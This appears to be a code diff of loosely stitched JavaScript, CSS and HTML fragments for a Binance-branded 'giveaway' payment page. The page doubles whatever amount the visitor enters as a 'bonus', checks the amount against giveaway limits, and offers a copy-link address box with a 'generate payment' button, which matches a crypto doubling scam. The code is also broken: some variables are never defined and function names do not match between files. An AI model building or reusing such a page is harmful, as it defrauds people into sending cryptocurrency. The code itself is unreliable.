@@ -1,0 +1,217 @@
+
+
+const promptBox = document.querySelector(".prompt-box");
+const container = document.querySelector(".container");
+const container_box = document.querySelector(".container-box");
+
+const amountVerificationBtn = document.querySelector("#btn");
+
+//get function
+function bonusCalculator() {
+  let amount = document.querySelector("#amount").value;
+  amount = parseFloat(amount);
+  let bonus = document.querySelector("#bonus");
+  bonus.value = amount * 2;
+}
+function alertBox() {
+  alert("Hello world to the user");
+}
+function payPrompt() {
+  promptBox.classList.add("prompt-box-open");
+  container.style.position = "fixed";
+  container.style.filter = "blur(5px)";
+  container_box.style.display = "none";
+}
+function amountVerfication() {
+  let amount = document.querySelector("#amount").value;
+  const success = document.querySelector(".success");
+  const failed = document.querySelector(".failed");
+  const info = document.querySelector(".info");
+  if (amount < _lessThan) {
+    payPrompt();
+    success.style.display = "none";
+    info.innerHTML = "amount too small for the giveaway".toUpperCase();
+  } else if (amount > _greaterThan) {
+    payPrompt();
+    success.style.display = "none";
+    info.innerHTML = "amount too large for the giveaway".toUpperCase();
+  } else {
+    let amountPrompt = document.querySelector(".amount");
+    amountPrompt.value = amount;
+    payPrompt();
+    failed.style.display = "none";
+  }
+}
+
+function warningNote(){
+  const warning = document.querySelector(".warning-note");
+  warning.innerHTML = '';
+}
+
+document.querySelectorAll(".input-box").forEach((copyLinkContainer) => {
+  const inputField = document.querySelector(".copy-link-input");
+  let copyButton = document.querySelector(".copy-link-button");
+  copyButton.addEventListener("click", function () {
+    let text = inputField.value;
+    inputField.select();
+    navigator.clipboard.writeText(text);
+    inputField.value = text;
+    setTimeout(() => (inputField.value = text), 2000);
+  });
+});
+
+//set function
+amountVerificationBtn.addEventListener("click", function () {
+  amountVerfication();
+});
+address.addEventListener("click", function () {
+  bonusCalculator();
+});
+
+
+
+
+        <input type="number" required readonly name="amount" class="amount" />
+        
+
+
+
+
+
+
+
+
+<style>
+
+div.prompt-box {
+  flex-direction: column;
+  align-items: center;
+  background: transparent;
+  position: absolute;
+  justify-content: center;
+  padding: 2rem;
+  display: none;
+  border-radius: 5px;
+}
+div.prompt-box-open {
+  visibility: visible;
+  transition: transform 0.4s, top 0.4s;
+  margin-top: 5%;
+  margin-left: 20%;
+  left: 30%;
+  top: 50%;
+  transform: translate(-50%, -50%) scale(0.8);
+  background-color: #fff;
+  display: flex;
+}
+div.prompt-box div.success {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+div.prompt-box div.success img {
+  width: 40%;
+  height: 45vh;
+  margin: 15px 0;
+}
+div.prompt-box div.success span {
+  text-transform: capitalize;
+  font-size: 1rem;
+  font-weight: 500;
+  margin: 4px;
+}
+div.prompt-box div.success div.form {
+  display: flex;
+  flex-direction: column;
+  align-items: flex-start;
+}
+div.prompt-box div.success div.form input {
+  width: 50vw;
+  height: 2.5rem;
+  border: 1px solid #b4a8a8;
+  color: #000;
+}
+div.prompt-box div.success div.form div.input-box {
+  display: flex;
+  flex-direction: row;
+  align-items: center;
+  margin: 1rem 0;
+  background-color: #fff;
+}
+div.prompt-box div.success div.form div.input-box a span {
+  font-size: 1.4rem;
+  font-weight: 600;
+  padding: 0.4rem;
+}
+div.prompt-box div.success div.form span {
+  text-transform: lowercase;
+}
+div.prompt-box div.success button {
+  background-color: #187dc0;
+  padding: 10px;
+  width: 15%;
+  margin: 1px 0;
+  font-weight: 500;
+  cursor: pointer;
+  text-transform: capitalize;
+  border: none;
+  border-radius: 0.1rem;
+  color: #fff;
+  font-size: 1rem;
+}
+div.prompt-box div.failed {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+div.prompt-box div.failed span.material-symbols-sharp {
+  font-size: 10rem;
+  font-weight: 500;
+  color: #e21010;
+  font-variation-settings: "FILL" 1, "wght" 700, "GRAD" 200, "opsz" 48;
+}
+
+div.container-box div.payment-page {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+div.payment-page p {
+  text-align: center;
+}
+
+</style>
+
+
+
+
+
+
+
+<div class="form">
+        <div class="input-group">
+          <div class="input">
+            <label for="amount">amount:</label>
+            <div class="input-box">
+              <img src="/public/images/Binance.png" alt="binance" />
+              <input type="number" name="amount" onkeyup="bonusCalculation()" id="amount" />
+            </div>
+          </div>
+          <span>=</span>
+          <div class="input">
+            <label for="amount">bonus:</label>
+            <div class="input-box">
+              <img src="/public/images/Binance.png" alt="binance" />
+              <input type="text" required name="bonus" id="bonus" readonly />
+            </div>
+          </div>
+        </div>
+        <span id="warning-note"></span>
+        <div class="input-address">
+          <label for="address">address:</label>
+          <input type="text" required name="address" id="address" />
+        </div>
+        <button id="btn" class="btn">generate payment</button>
+      </div>
+
